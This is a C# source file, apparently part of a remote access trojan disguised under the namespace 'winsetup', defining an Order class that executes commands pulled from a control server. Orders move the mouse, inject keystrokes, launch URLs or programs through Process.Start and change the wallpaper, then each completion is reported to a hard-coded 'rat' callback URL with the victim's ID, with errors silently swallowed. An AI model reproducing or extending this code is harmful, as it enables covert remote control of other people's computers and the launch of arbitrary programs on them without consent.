using HtmlAgilityPack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winsetup
{
    class Order:IComparable,IEquatable<Order>
    {
        public int ID { get; set; }
        public string Type { get; set; }
        public string Data { get; set; }
        public bool Executed { get; set; } = false;
        
        private static string callbackUrl = "http://s.my.to/rat/reg.php?mode=rorder&dat=";
        private static HtmlWeb web;
        public static Form1 Parent;

        static Order()
        {
            web = new HtmlWeb();
        }
        
        public Order(int id, string type,string data)
        {
            ID = id;
            Type = type;
            Data = data;
        }

        public static Order FromString(string s)
        {
            var arr = s.Split(';');
            if(arr.Length == 3)
            {
                return new Order(int.Parse(arr[0]), arr[1], arr[2]);
            }
            throw new Exception("Invalid string");
        }
        
        public void Execute()
        {
            try
            {
                if (!Executed && Type != null && Data != null)
                {
                    var arr = Data.Split(';');
                    switch (Type)
                    {
                        case "moveMouse":
                            Cursor.Position = new System.Drawing.Point(int.Parse(arr[0]), int.Parse(arr[1]));
                            break;
                        case "typeKeys":
                            SendKeys.SendWait(Data);
                            break;
                        case "openUrl":
                            Executed = true;
                            Process.Start(Data);
                            break;
                        case "setBg":
                            Wallpaper.Set(new Uri(Data), Wallpaper.Style.Centered);
                            break;
                        default:
                            break;
                    }
                    Executed = true;
                    web.Load(callbackUrl + $"{Parent.Guid};{ID}");
                }
            }
            catch (Exception)
            {

                
            }
        }

        public int CompareTo(object obj)
        {
            var t = (Order)obj;
            if (t.ID < ID)
                return 1;
            else if (t.ID > ID)
                return -1;
            else
                return 0;
        }

        public bool Equals(Order other)
        {
            return ID == other.ID;
        }
    }
}
